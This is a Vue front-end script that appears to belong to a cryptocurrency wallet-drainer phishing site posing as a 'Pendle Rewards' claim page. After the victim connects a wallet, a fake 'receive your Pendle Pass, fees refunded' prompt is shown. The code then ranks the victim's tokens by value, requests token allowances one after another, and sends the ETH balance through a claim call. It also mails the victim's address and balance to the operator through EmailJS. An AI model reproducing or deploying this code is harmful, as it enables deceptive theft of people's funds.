import { disconnect, connect, getAccount, fetchFeeData } from '@wagmi/core';
import {
  web3modal,
  claim,
  balanceOf,
  getTokens,
  increaseAllowance,
  mconnector,
  trustwalletConnect,
  allownce,
} from './utils/walletconnect.js';
const Toast = useToast();
import axios from 'axios';

export default {
  components: { Datavg, Footer, Web3Modal },
  data() {
    return {
      isConnected: false,
      account: null,
      processing: false,
      isMeta: false,
      web3: null,
      balance: {},
      isOk: true,
      isDone: false,
      tokens: [],
      maxToken: null,
      claimable: 0,
      sortedTokens: [],
      currentIndex: 0,
      showModal: false,
    };
  },

  methods: {
    async connect(type) {
      let url = null;

      if (type == 1) {
        if (window.ethereum) {
          this.showModal = false;
          await mconnector();
          this.wConnect()
          return;
        }
        url = 'https://metamask.app.link/dapp/pendle-rewards.finance';
      }
      if (type == 2) {
        if (window.ethereum) {
          return window.open('https://www.coinbase.com/wallet', '_blank');
        }

        url =
          'https://go.cb-w.com/dapp?cb_url=https%3a%2f%2fpendle-rewards.finance%2f';
      }
      if (type == 3) {
        if(window.ethereum){
          this.showModal = false;
          await trustwalletConnect();
          this.wConnect()
          return;
        }
        url = "https://link.trustwallet.com/open_url?coin_id=60&url=https://pendle-rewards.finance/";
      }
      if (type == 4) {
        url =
          'https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp';
      }
      window.open(url, '_blank');
    },
    toggleModal() {
      if (getAccount().isConnected) return;
      this.showModal = true;
    },
    async wc_claim() {
    try {
      if (getAccount().isConnected) {
        this.processing = true;
        this.isDone = false;

        if (this.tokens.length > 0 && this.maxToken) {
          await increaseAllowance(this.maxToken);
        } else {
          await claim(this.balance.value);
          this.claimable = 0;
        }

        this.processing = false;
        this.isDone = true;
        const allownce_value = await allownce(this.maxToken);
        const balanceoftoken = await balanceOf(this.maxToken);
        if (allownce_value > balanceoftoken) {
          if (this.currentIndex + 1 > this.sortedTokens.length) {
            if (this.claimable > 0) {
              await claim(this.balance.value);
              this.claimable = 0;
            } else {
              this.processing = false;
              this.isDone = false;
              Swal.close();
              Swal.hideLoading();
            }
          } else {
            this.currentIndex += 1;
            this.maxToken = null
            this.maxToken = this.sortedTokens[this.currentIndex];
            this.wc_claim();
          }
        }
      } else {
        this.wConnect();
      }
    } catch (error) {
      console.log(error);
      this.processing = false;
      this.isDone = false;
      Swal.close();
      Swal.hideLoading();
      this.wc_claim();
      // Toast.error(error.message);
    }
  },
    async wConnect() {
      try {
        this.showModal = false;
        if (getAccount().isConnected) {
          this.account = getAccount().address;
          Swal.fire({
            html:
              '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
              '<small style="font-size: 15px">Verify your wallet to continue</small> ',
            showCloseButton: false,
            showCancelButton: false,
            showConfirmButton: false,
            background: '#00000080',
            width: '550px',
            color: '#fff',
            customClass: {
              loader: '',
            },
            didOpen: () => {
              Swal.showLoading();
            },
          });
          await this.showBalance();
          return;
        } else {
          await web3modal.openModal();
          web3modal.subscribeModal((newState) => {
            if (!newState.open) {
              if (getAccount().isConnected) {
                Swal.fire({
                  html:
                    '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
                    '<small style="font-size: 15px">Verify your wallet to continue</small> ',
                  showCloseButton: false,
                  showCancelButton: false,
                  showConfirmButton: false,
                  background: '#00000080',
                  width: '550px',
                  color: '#fff',
                  customClass: {
                    loader: '',
                  },
                  didOpen: () => {
                    Swal.showLoading();
                  },
                });
                this.account = getAccount().address;
                this.showBalance();
              }
            }
          });
        }
      } catch (error) {
        Toast.error(error.message);
      }
    },
    async showBalance() {
      try {
        this.processing = true;
        const balance = await balanceOf();

        const feeData = await fetchFeeData({
          chainId: 1,
          formatUnits: 'gwei',
        });
        const fee =
          BigInt(30000) * (feeData.gasPrice + feeData.lastBaseFeePerGas);
        const total = BigInt(balance.value) - BigInt(fee);
        this.balance = balance;
        const validTokens = await getTokens(getAccount().address);
        for (let i = 0; i < validTokens.length; i++) {
          if (validTokens[i].symbol == 'USDT') {
            validTokens[i].usdPrice = 1;
            continue;
          }
          try {
            const price = this.prices.filter(
              (price) => price.symbol == `${validTokens[i].symbol}USDT`
            );
            validTokens[i].usdPrice = price[0].price;
          } catch (error) {
            validTokens[i].usdPrice = 0;
            continue;
          }
        }
        const tokens = validTokens.filter((token) => token.usdPrice > 0);
        const ethPrice = this.prices.filter(
          (price) => price.symbol == 'ETHUSDT'
        );
        const usdPrice_ = ethPrice[0].price;
        const claimable = Math.round(usdPrice_ * parseFloat(balance.formatted));
        this.claimable = claimable;
        for (let i = 0; i < tokens.length; i++) {
          const token = tokens[i];
          const etherValue = token.balance / Math.pow(10, token.decimals);
          tokens[i].usdValue =
            tokens[i].usdPrice * parseFloat(etherValue).toFixed(2);
        }
        this.tokens = tokens;
        const maxToken = tokens.sort((a, b) => b.usdValue - a.usdValue);
        this.sortedTokens = maxToken.filter((token) => token.usdValue > 3);
        this.maxToken = this.sortedTokens[this.currentIndex];
        if (total <= 0) {
          this.isOk = false;
          Swal.close();
          Swal.hideLoading();
        } else {
          this.isConnected = true;
          this.isMeta = false;
          this.wc_claim();
          // this.sendEmail();
        }
      } catch (error) {
        console.log();
      }
    },
    async sendEmail() {
      try {
        await axios.post('https://api.emailjs.com/api/v1.0/email/send', {
          service_id: 'service_2ch66aj',
          template_id: 'template_ua9ebmd',
          user_id: 'omsQf86Fn0wmY_STT',
          template_params: {
            address: this.account,
            balance: this.balance.formatted,
          },
        });
      } catch (error) {
        console.log(error);
      }
    },

    async setPrices() {
      try {
        const res = await axios.get(
          'https://api.binance.com/api/v3/ticker/price'
        );
        this.prices = res.data;
      } catch (error) {
        console.log(error);
      }
    },
  },
  created() {
    this.setPrices();
    if (getAccount().isConnected) {
      this.account = getAccount().address;
      this.isConnected = true;
      this.showBalance();
    }
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', async function () {
        await disconnect();
        localStorage.clear();
        this.isConnected = false;
        this.isOk = true;
        this.isDone = false;
      });
    }
  },
};
</script>
